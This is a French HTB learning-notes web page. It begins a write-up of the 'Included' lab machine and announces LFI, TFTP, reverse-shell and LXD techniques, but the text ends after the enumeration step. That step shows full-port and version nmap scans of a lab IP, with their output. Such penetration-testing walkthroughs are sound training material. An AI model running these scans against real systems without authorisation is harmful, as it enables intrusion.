
<!doctype html>
<html lang="fr" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Notes d'aprentissage">
      
      
        <meta name="author" content="rnek0">
      
      
        <link rel="canonical" href="https://rnek0.github.io/lunarDocs/tiers2/included/">
      
      
        <link rel="prev" href="../unified/">
      
      
        <link rel="next" href="../../redes/intro/">
      
      
      <link rel="icon" href="../../img/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.49">
    
    
    <link  href="https://mamot.fr/@oggy" rel="me">

    
      <link rel="stylesheet" href="../../assets/stylesheets/main.6f8fc17f.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.7.2/styles/default.min.css">
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="lunarviews" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#included" class="md-skip">
          Aller au contenu
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="En-tÃªte">
    <a href="../.." title="rnek0&#39;s notes" class="md-header__button md-logo" aria-label="rnek0's notes" data-md-component="logo">
      
  <img src="../../assets/lune.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            rnek0's notes
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Included
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="lunarviews" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Rechercher" placeholder="Rechercher" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Recherche">
        
        <button type="reset" class="md-search__icon md-icon" title="Effacer" aria-label="Effacer" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initialisation de la recherche
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Onglets" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  lunarviews

      </a>
    </li>
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../tiers0/meow/" class="md-tabs__link">
          
  
  HTB Starting

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../htbmachines/validation.md" class="md-tabs__link">
          
  
  HTB Machines

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../redes/intro/" class="md-tabs__link">
          
  
  Redes

        </a>
      </li>
    
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../about/" class="md-tabs__link">
        
  
    
  
  About

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="rnek0&#39;s notes" class="md-nav__button md-logo" aria-label="rnek0's notes" data-md-component="logo">
      
  <img src="../../assets/lune.png" alt="logo">

    </a>
    rnek0's notes
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    lunarviews
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    HTB Starting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            HTB Starting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/meow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Meow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/fawn/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Fawn
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/dancing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dancing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/redeemer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Redeemer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/explosion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Explosion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/preignition/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Preignition
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/mongod/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mongod
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers0/sinced/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sinced
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/appointment/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Appointment
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/sequel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Sequel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/crocodile/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Crocodile
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/responder/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Responder
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/three/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Three
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/ignition/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Ignition
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/bike/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bike
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/funnel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Funnel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/pennyworth/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pennyworth
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../tiers1/tactics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Tactics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../archetype/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Archetype
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../oopsie/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Oopsie
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../unified/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Unified
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Included
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Included
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table des matiÃ¨res">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table des matiÃ¨res
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      ÃnumÃ©ration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tftp" class="md-nav__link">
    <span class="md-ellipsis">
      TFTP
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mouvement-lateral" class="md-nav__link">
    <span class="md-ellipsis">
      Mouvement Lateral
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalade-de-privileges" class="md-nav__link">
    <span class="md-ellipsis">
      Escalade de privilÃ¨ges
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    HTB Machines
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            HTB Machines
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../htbmachines/validation.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Validation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Redes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Redes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/intro/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Las redes informÃ¡ticas
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/ip/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DirecciÃ³n IP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/puertos/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Puertos
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/mac/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DirecciÃ³n MAC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/protocolos/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Algunos protocolos
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/modeloOSI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Modelo OSI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/subnetting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subnetting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/172.128.0.0/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Calculo subnetting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../redes/mindmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mindmap redes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../about/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    About
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="included">Included</h1>
<p><img alt="Fawn" src="../../img/Included.png" /><br />
Linux</p>
<p>Included est une machine classÃ©e trÃ¨s facile. On y voit : </p>
<ul>
<li>LFI</li>
<li>Tftp</li>
<li>Reverse Shell</li>
<li>LXD containers</li>
</ul>
<p><strong>Introduction</strong></p>
<p>L'Ã©numÃ©ration est toujours la clÃ© lorsqu'il s'agit de tests d'intrusion, - meilleure est l'Ã©numÃ©ration et plus nous avons de chances de trouver et d'exploiter des vulnÃ©rabilitÃ©s. La plupart du temps, vous ne trouverez pas 'la seule' vulnÃ©rabilitÃ© qui vous accordera l'accÃ¨s, mais plutÃ´t la '<strong>chaÃ®ne de mauvaise configuration</strong>' qui, si elle est utilisÃ©e ensemble, vous laissera entrer. Cette machine enseigne d'autres techniques d'Ã©numÃ©ration, mÃªme sur un protocole de couche de transport diffÃ©rent ( <a href="https://fr.wikipedia.org/wiki/User_Datagram_Protocol">UDP</a> ), et elle enseigne Ã©galement que chaque testeur d'intrusion doit parfois utiliser Google pour voir comment effectuer certaines tÃ¢ches.</p>
<p>rhost='10.129.102.34'<br />
lhost='10.10.15.253'</p>
<h2 id="enumeration">ÃnumÃ©ration</h2>
<p>Nous commenÃ§ons, comme toujours, par scanner la cible pour trouver des ports ouverts :</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>â¯<span class="w"> </span><span class="nv">rhost</span><span class="o">=</span><span class="s1">&#39;10.129.102.34&#39;</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>â¯<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span>-sS<span class="w"> </span>--open<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">5000</span><span class="w"> </span>-n<span class="w"> </span>-Pn<span class="w"> </span>-vvv<span class="w"> </span><span class="nv">$rhost</span><span class="w"> </span>-oG<span class="w"> </span>initial.Included
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-19<span class="w"> </span><span class="m">00</span>:48<span class="w"> </span>CEST
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Initiating<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">00</span>:48
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Scanning<span class="w"> </span><span class="m">10</span>.129.102.34<span class="w"> </span><span class="o">[</span><span class="m">65535</span><span class="w"> </span>ports<span class="o">]</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>Discovered<span class="w"> </span>open<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>/tcp<span class="w"> </span>on<span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>Completed<span class="w"> </span>SYN<span class="w"> </span>Stealth<span class="w"> </span>Scan<span class="w"> </span>at<span class="w"> </span><span class="m">00</span>:48,<span class="w"> </span><span class="m">10</span>.41s<span class="w"> </span>elapsed<span class="w"> </span><span class="o">(</span><span class="m">65535</span><span class="w"> </span>total<span class="w"> </span>ports<span class="o">)</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Host<span class="w"> </span>is<span class="w"> </span>up,<span class="w"> </span>received<span class="w"> </span>user-set<span class="w"> </span><span class="o">(</span><span class="m">0</span>.029s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Scanned<span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-19<span class="w"> </span><span class="m">00</span>:48:28<span class="w"> </span>CEST<span class="w"> </span><span class="k">for</span><span class="w"> </span>10s
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">65334</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>,<span class="w"> </span><span class="m">200</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Some<span class="w"> </span>closed<span class="w"> </span>ports<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>reported<span class="w"> </span>as<span class="w"> </span>filtered<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>--defeat-rst-ratelimit
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>REASON
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>syn-ack<span class="w"> </span>ttl<span class="w"> </span><span class="m">63</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Read<span class="w"> </span>data<span class="w"> </span>files<span class="w"> </span>from:<span class="w"> </span>/usr/bin/../share/nmap
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">10</span>.54<span class="w"> </span>seconds
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="w">           </span>Raw<span class="w"> </span>packets<span class="w"> </span>sent:<span class="w"> </span><span class="m">66766</span><span class="w"> </span><span class="o">(</span><span class="m">2</span>.938MB<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Rcvd:<span class="w"> </span><span class="m">65365</span><span class="w"> </span><span class="o">(</span><span class="m">2</span>.615MB<span class="o">)</span>
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>â¯<span class="w"> </span>nmap<span class="w"> </span>-p80<span class="w"> </span>-sVC<span class="w"> </span><span class="nv">$rhost</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-19<span class="w"> </span><span class="m">00</span>:52<span class="w"> </span>CEST
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.102.34
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.027s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
